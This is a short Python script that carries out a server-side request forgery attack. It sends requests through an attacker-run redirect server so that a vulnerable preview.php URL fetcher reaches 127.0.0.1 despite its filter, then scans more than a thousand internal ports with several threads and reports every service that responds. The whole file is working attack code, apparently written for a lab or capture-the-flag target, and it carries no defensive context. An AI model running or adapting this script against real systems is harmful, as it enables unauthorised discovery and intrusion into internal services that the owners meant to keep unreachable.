import requests, urllib.parse
from concurrent.futures import ThreadPoolExecutor

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='

# Ports that might only bind to 127.0.0.1 (not accessible via cvssm1 hostname)
ports = list(range(1, 1025)) + [
    1337, 1338, 2222, 3000, 3001, 3306, 4000, 4200, 4443, 4567,
    5000, 5001, 5432, 5984, 6379, 7474, 8000, 8080, 8081, 8082,
    8088, 8090, 8100, 8200, 8443, 8500, 8888, 8983, 9000, 9090,
    9200, 9300, 9418, 9443, 9999, 10000, 11211, 27017, 28017
]
ports = sorted(set(ports))

def check(port):
    target = f'http://127.0.0.1:{port}/'
    redir = f'{attacker}/redirect?to={urllib.parse.quote(target, safe="")}'
    try:
        r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=4)
        body = r.text.strip()
        if body and 'blocked' not in body.lower() and len(body) > 0:
            return (port, len(body), body[:80].replace('\n', ' '))
    except Exception:
        pass
    return None

print(f'Scanning {len(ports)} ports on 127.0.0.1 via redirect bypass...')
with ThreadPoolExecutor(max_workers=8) as ex:
    for res in ex.map(check, ports):
        if res:
            print(f'[OPEN] 127.0.0.1:{res[0]}  ({res[1]}b)  {res[2]}')

print('Done.')
